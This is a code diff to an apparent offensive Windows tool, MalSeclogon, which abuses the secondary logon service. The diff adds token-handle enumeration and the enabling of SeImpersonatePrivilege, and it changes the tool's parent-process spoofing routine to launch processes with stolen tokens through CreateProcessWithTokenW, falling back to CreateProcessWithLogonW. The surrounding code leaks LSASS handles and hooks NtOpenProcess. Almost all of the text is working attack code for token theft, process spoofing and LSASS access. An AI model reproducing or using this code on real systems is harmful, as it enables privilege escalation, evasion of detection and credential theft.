@@ -6,9 +6,11 @@
 void usage();
 BOOL SetPrivilege(HANDLE hToken, wchar_t* lpszPrivilege, BOOL bEnablePrivilege);
 void EnableDebugPrivilege(BOOL enforceCheck);
+BOOL EnableImpersonatePrivilege();
 void SpoofPidTeb(DWORD spoofedPid, PDWORD originalPid, PDWORD originalTid);
 void RestoreOriginalPidTeb(DWORD originalPid, DWORD originalTid);
 void FindProcessHandlesInLsass(DWORD lsassPid, HANDLE* handlesToLeak, PDWORD handlesToLeakCount);
+void FindTokenHandlesInProcess(DWORD targetPid, HANDLE* tokenHandles, PDWORD tokenHandlesLen);
 void MalSeclogonPPIDSpoofing(int lsassPid, wchar_t* cmdline);
 void ReplaceNtOpenProcess(HANDLE leakedHandle, char* oldCode, int* oldCodeSize);
 void RestoreNtOpenProcess(char* oldCode, int oldCodeSize);
@@ -141,6 +143,14 @@ void EnableDebugPrivilege(BOOL enforceCheck) {
 	}
 	CloseHandle(currentProcessToken);
 }
+
+BOOL EnableImpersonatePrivilege() {
+	HANDLE currentProcessToken = NULL;
+	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentProcessToken);
+	BOOL setPrivilegeSuccess = SetPrivilege(currentProcessToken, L"SeImpersonatePrivilege", TRUE);
+	CloseHandle(currentProcessToken);
+	return setPrivilegeSuccess;
+}
  
 void SpoofPidTeb(DWORD spoofedPid, PDWORD originalPid, PDWORD originalTid) {
 	CLIENT_ID CSpoofedPid;
@@ -165,8 +175,6 @@ void RestoreOriginalPidTeb(DWORD originalPid, DWORD originalTid) {
 	memcpy(pointerToTebPid, &CRealPid, sizeof(CLIENT_ID));
 	VirtualProtect(pointerToTebPid, sizeof(CLIENT_ID), oldProtection, &oldProtection2);
 }
-
-
 
 NTSTATUS QueryObjectTypesInfo(__out POBJECT_TYPES_INFORMATION* TypesInfo) {
 	NTSTATUS Status;
@@ -239,23 +247,82 @@ void FindProcessHandlesInLsass(DWORD lsassPid, HANDLE *handlesToLeak, PDWORD han
 	free(handleInfo);
 }
 
+void FindTokenHandlesInProcess(DWORD targetPid, HANDLE* tokenHandles, PDWORD tokenHandlesLen)
+{
+	PSYSTEM_HANDLE_INFORMATION handleInfo = NULL;
+	DWORD handleInfoSize = 0x10000;
+	NTSTATUS status;
+	ULONG processTypeIndex;
+	UNICODE_STRING processTypeName = RTL_CONSTANT_STRING(L"Token");
+	status = GetTypeIndexByName(&processTypeName, &processTypeIndex);
+	if (!NT_SUCCESS(status)) {
+		printf("GetTypeIndexByName failed 0x%08x\n", status);
+		exit(-1);
+	}
+	pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");
+	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
+	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
+		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
+	for (DWORD i = 0; i < handleInfo->HandleCount; i++) {
+		if (handleInfo->Handles[i].ObjectTypeIndex == processTypeIndex && handleInfo->Handles[i].UniqueProcessId == targetPid) {
+			tokenHandles[*tokenHandlesLen] = (HANDLE)handleInfo->Handles[i].HandleValue;
+			*tokenHandlesLen = *tokenHandlesLen + 1;
+		}
+	}
+	free(handleInfo);
+}
 
 void MalSeclogonPPIDSpoofing(int pid, wchar_t* cmdline)
 {
 	PROCESS_INFORMATION procInfo;
 	STARTUPINFO startInfo;
 	DWORD originalPid, originalTid;
+	HANDLE tokenHandles[8192];
+	DWORD tokenHandlesCount = 0;
+	BOOL useCreateProcessWithToken = FALSE;
+	BOOL processCreatedWithToken = FALSE;
 	EnableDebugPrivilege(FALSE);
 	SpoofPidTeb((DWORD)pid, &originalPid, &originalTid);
 	RtlZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));
 	RtlZeroMemory(&startInfo, sizeof(STARTUPINFO));
-	if (!CreateProcessWithLogonW(L"MalseclogonUser", L"MalseclogonDomain", L"MalseclogonPwd", LOGON_NETCREDENTIALS_ONLY, NULL, cmdline, 0, NULL, NULL, &startInfo, &procInfo)) {
-		printf("CreateProcessWithLogonW() failed with error code %d \n", GetLastError());
-		exit(-1);
+	if (EnableImpersonatePrivilege()) {
+		FindTokenHandlesInProcess(pid, tokenHandles, &tokenHandlesCount);
+		if (tokenHandlesCount < 1) {
+			printf("No token handles found in process %d, can't use CreateProcessWithToken(). Reverting to CreateProcessWithLogon()...\n", pid);
+			useCreateProcessWithToken = FALSE;
+		}
+		else
+			useCreateProcessWithToken = TRUE;
+	}
+	else {
+		printf("Impersonation privileges not available, can't use CreateProcessWithToken(). Reverting to CreateProcessWithLogon()...\n");
+		useCreateProcessWithToken = FALSE;
+	}
+	if (useCreateProcessWithToken) {
+		for (DWORD i = 0; i < tokenHandlesCount; i++) {
+			if (CreateProcessWithTokenW(tokenHandles[i], 0, NULL, cmdline, 0, NULL, NULL, &startInfo, &procInfo)) {
+				processCreatedWithToken = TRUE;
+				break;
+			}
+		}
+		if (processCreatedWithToken) {
+			// the returned handles in procInfo are wrong and duped into the spoofed parent process, so we can't close handles or wait for process end.
+			printf("Spoofed process %S created correctly as child of PID %d using CreateProcessWithTokenW()!", cmdline, pid);
+		}
+		else {
+			printf("CreateProcessWithTokenW() failed with error code %d \n", GetLastError());
+		}
+	}
+	else {
+		if (!CreateProcessWithLogonW(L"MalseclogonUser", L"MalseclogonDomain", L"MalseclogonPwd", LOGON_NETCREDENTIALS_ONLY, NULL, cmdline, 0, NULL, NULL, &startInfo, &procInfo)) {
+			printf("CreateProcessWithLogonW() failed with error code %d \n", GetLastError());
+		}
+		else {
+			// the returned handles in procInfo are wrong and duped into the spoofed parent process, so we can't close handles or wait for process end.
+			printf("Spoofed process %S created correctly as child of PID %d using CreateProcessWithLogonW()!", cmdline, pid);
+		}
 	}
 	RestoreOriginalPidTeb(originalPid, originalTid);
-	// the returned handles in procInfo are wrong and duped into the spoofed parent process, so we can't close handles or wait for process end.
-	printf("Spoofed process %S created correctly as child of PID %d !", cmdline, pid);
 }
 
 BOOL FileExists(LPCTSTR szPath)
